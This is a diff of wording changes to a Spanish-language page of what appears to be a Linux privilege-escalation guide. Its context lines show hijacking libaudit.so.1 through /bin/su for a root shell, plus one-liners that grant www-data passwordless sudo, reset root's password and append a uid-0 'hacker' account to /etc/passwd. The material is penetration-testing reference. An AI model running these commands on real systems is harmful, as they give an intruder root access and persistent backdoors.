@@ -51,11 +51,11 @@ return 0;
 - Añadir un usuario con contraseña a _/etc/passwd_
 - Cambiar la contraseña dentro de _/etc/shadow_
 - Añadir un usuario a sudoers en _/etc/sudoers_
-- Abusar de docker a través del socket de docker, normalmente en _/run/docker.sock_ o _/var/run/docker.sock_
+- Abusar de docker mediante el docker socket, normalmente en _/run/docker.sock_ o _/var/run/docker.sock_
 
 ### Sobrescribir una library
 
-Comprobar una library utilizada por algún binario, en este caso `/bin/su`:
+Comprobar una library utilizada por algún binary, en este caso `/bin/su`:
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -68,7 +68,7 @@ libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
 En este caso, intentemos suplantar `/lib/x86_64-linux-gnu/libaudit.so.1`.\
-Así que, comprueba las funciones de esta library utilizadas por el binario **`su`**:
+Por lo tanto, comprueba las funciones de esta library utilizadas por el binario **`su`**:
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -76,7 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-Los símbolos `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` y `audit_fd` probablemente pertenecen a la biblioteca libaudit.so.1. Como libaudit.so.1 será sobrescrita por la biblioteca compartida maliciosa, estos símbolos deben estar presentes en la nueva biblioteca compartida; de lo contrario, el programa no podrá encontrar el símbolo y finalizará.
+Los símbolos `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` y `audit_fd` probablemente pertenecen a la biblioteca libaudit.so.1. Como libaudit.so.1 será sobrescrita por la biblioteca compartida maliciosa, estos símbolos deben estar presentes en la nueva biblioteca compartida; de lo contrario, el programa no podrá encontrar el símbolo y terminará.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -104,7 +104,7 @@ Ahora, simplemente llamando a **`/bin/su`**, obtendrás una shell como root.
 
 ¿Puedes hacer que root ejecute algo?
 
-### **www-data a sudoers**
+### **www-data to sudoers**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
@@ -112,7 +112,7 @@ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers
 ```bash
 echo "root:hacked" | chpasswd
 ```
-### Añadir un nuevo usuario root a /etc/passwd
+### Añadir nuevo usuario root a /etc/passwd
 ```bash
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
